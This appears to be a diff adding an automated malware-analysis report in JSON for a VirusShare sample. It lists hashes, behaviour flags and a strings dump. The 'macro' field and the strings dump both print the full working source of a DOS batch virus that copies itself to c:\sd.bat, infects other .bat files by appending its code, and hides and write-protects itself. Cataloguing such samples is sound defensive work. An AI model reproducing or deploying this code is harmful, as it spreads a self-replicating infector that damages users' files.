@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif %2==sd_inf goto sd_inf\nif not exist c:\\sd.bat copy sd.bat c:\\ >nul\nif not exist c:\\sd.bat copy %0.bat c:\\sd.bat >nul\nfor %%a in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat) do call %0 %%a sd_inf\ngoto fin\n:sd_inf\nfind \"sd\"<%1>nul\nif not errorlevel 1 goto fin\n\ntype %1>bakk.bak\necho @echo off>%1\necho if %%2==sd_inf goto sd_inf>>%1\necho cls>>%1\ntype bakk.bak>>%1\ntype c:\\sd.bat>>%1\nattrib %1 +r\n:fin\nattrib c:\\sd.bat +h +r"
+    },
+    "filename": "VirusShare_365c070b3ef42843d230c054feefa9c5",
+    "filesize": 451,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "365c070b3ef42843d230c054feefa9c5",
+        "sha1": "28652749c6237aab0bb391d7fa852ab2d648f5e4",
+        "sha256": "03d3904002586239af7ac6d35f40187cb38f36136eb8472ceca8a3e75bd748a7"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if %2==sd_inf goto sd_inf",
+            "if not exist c:\\sd.bat copy sd.bat c:\\ >nul",
+            "if not exist c:\\sd.bat copy %0.bat c:\\sd.bat >nul",
+            "for %%a in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat) do call %0 %%a sd_inf",
+            "goto fin",
+            ":sd_inf",
+            "find \"sd\"<%1>nul",
+            "if not errorlevel 1 goto fin",
+            "type %1>bakk.bak",
+            "echo @echo off>%1",
+            "echo if %%2==sd_inf goto sd_inf>>%1",
+            "echo cls>>%1",
+            "type bakk.bak>>%1",
+            "type c:\\sd.bat>>%1",
+            "attrib %1 +r",
+            ":fin",
+            "attrib c:\\sd.bat +h +r"
+        ],
+        "file": {
+            "type %1>bakk.bak": "Backup"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.252348",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
